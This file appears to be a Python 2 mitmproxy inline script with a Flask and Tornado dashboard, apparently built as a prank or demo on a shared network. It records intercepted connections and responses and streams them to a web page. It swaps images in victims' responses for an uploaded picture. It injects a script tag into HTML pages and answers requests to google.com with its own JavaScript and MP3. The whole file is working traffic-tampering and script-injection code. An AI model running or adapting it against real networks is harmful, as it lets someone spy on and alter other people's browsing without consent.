import json
import random
import socket
import threading
import re
from io import BytesIO
import tornado.ioloop
import tornado.web
import tornado.wsgi
import tornado.websocket
from PIL import Image
from flask import Flask, send_from_directory, redirect
from flask import request as req
from libmproxy.protocol.http import decoded, HTTPResponse
from netlib.odict import ODictCaseless

app = Flask("mitm", static_folder="client/app", static_url_path="")
app_wsgi = tornado.wsgi.WSGIContainer(app)
ws = None
tornado_app = None
tornado_thread = None
flows = {}
image_src = None
do_rick = False


@app.route("/")
def main():
    return send_from_directory("client/app", "index.html")


@app.route('/file', methods=['POST'])
def upload_file():
    f = req.files["file"]
    b = BytesIO()
    f.save(b)
    parse_image(b.getvalue())
    return redirect("/")

@app.route("/rick", methods=['POST'])
def rick():
    global do_rick
    do_rick = not do_rick

@app.route("/image/<id>")
def serve_image(id):
    resp = flows[id].response
    return resp.content, resp.code, resp.headers


class WebSocketHandler(tornado.websocket.WebSocketHandler):
    clients = []
    events = []

    def check_origin(self, origin):
        return True

    def open(self, *args):
        print("open", "WebSocketChatHandler")
        WebSocketHandler.clients.append(self)
        self.write_message(json.dumps({
            "type": "history",
            "data": WebSocketHandler.events
        }))

    @classmethod
    def broadcast(cls, type, data):
        message = {
            "type": type,
            "data": data
        }
        WebSocketHandler.events.append(message)
        for client in WebSocketHandler.clients:
            client.write_message(json.dumps(message))

    def on_close(self):
        WebSocketHandler.clients.remove(self)


def parse_image(d):
    global image_src
    s = BytesIO(d)
    image_src = Image.open(s)

def start(ctx, argv):
    #with open("wifi.jpg","rb") as f:
    #    parse_image(f.read())
    global tornado_app, tornado_thread
    tornado_app = tornado.web.Application([
        (r'/events', WebSocketHandler),
        (r".*", tornado.web.FallbackHandler, dict(fallback=app_wsgi))
    ])
    tornado_app.listen(8085)
    tornado_thread = threading.Thread(target=tornado.ioloop.IOLoop.instance().start)
    tornado_thread.daemon = True
    tornado_thread.start()
    print "started"


def done():
    print "done"


def memoize(f):
    memo = {}
    def wrapper(x):
        if x not in memo:
            memo[x] = f(x)
        return memo[x]
    return wrapper


@memoize
def gethostbyaddr(ip):
    try:
        print "gethostbyaddr..."
        host = socket.gethostbyaddr(ip)[0]
        print host
        return host
    except:
        return ip


def clientconnect(ctx, conn):
    def async():
        src = gethostbyaddr(conn.client_conn.address.host)
        if conn.server_conn:
            dst = gethostbyaddr(conn.server_conn.address.host)
        else:
            dst = random.choice(["example.com","github.com","tinder.com"])
        WebSocketHandler.broadcast("connection", dict(src=src, dst=dst))
    t = threading.Thread(target=async)
    t.daemon = True
    t.start()


def response(ctx, flow):
    """
    @param flow: libmproxy.protocol.http.HTTPFlow
    """
    flows[flow.id] = flow
    WebSocketHandler.broadcast("flow", flow.get_state(short=True))
    print "Received flow: %s" % flow

    is_image = (
        (re.search(r"(jpe?g|png|gif|webm)$", flow.request.path) or
        "image" in flow.response.headers.get_first("content-type", ""))
        and flow.response.content
    )
    if is_image:
        handle_image(flow)

    is_html = (
        (re.search(r"(html?|php|cgi)$", flow.request.path) or
        "html" in flow.response.headers.get_first("content-type", ""))
        and flow.response.content
        and "youtube" not in flow.request.pretty_host(hostheader=True)
    )
    if is_html:
        handle_html(flow)


def handle_image(flow):
    def async():
        WebSocketHandler.broadcast("image", dict(
            src=gethostbyaddr(flow.client_conn.address.host),
            dst=gethostbyaddr(flow.server_conn.address.host),
            imageURL="/image/%s" % flow.id))
    t = threading.Thread(target=async)
    t.daemon = True
    t.start()

    if image_src:
        s = BytesIO(flow.response.content)
        img = Image.open(s)

        global image_src
        dst = image_src.copy()
        dst.thumbnail(img.size, Image.ANTIALIAS)

        s = BytesIO()
        dst.save(s, format="png")

        flow.response.content = s.getvalue()
        flow.response.headers["content-type"] = ["image/png"]


def handle_html(flow):
    global do_rick
    if do_rick:
        rick_iframe = """<script type="text/javascript" src="//google.com/rick_js"></script>"""
        with decoded(flow.response):
            flow.response.content = re.sub("<body(.*?)>", r"<body\1>" + rick_iframe, flow.response.content, count=1)


with open("rick.js", "rb") as f:
    rick_js = f.read()
with open("rick.mp3", "rb") as f:
    rick_mp3 = f.read()



def request(ctx, flow):
    if flow.request.pretty_host(hostheader=True) == "google.com":
        if flow.request.path == "/rick_js":
            print "rick"
            flow.reply(HTTPResponse([1, 1], 200, "OK", ODictCaseless([["content-type","text/javascript"]]), rick_js))
        if flow.request.path == "/rick_mp3":
            print "mp3"
            flow.reply(HTTPResponse([1, 1], 200, "OK", ODictCaseless([["content-type", "audio/mpeg"]]), rick_mp3))
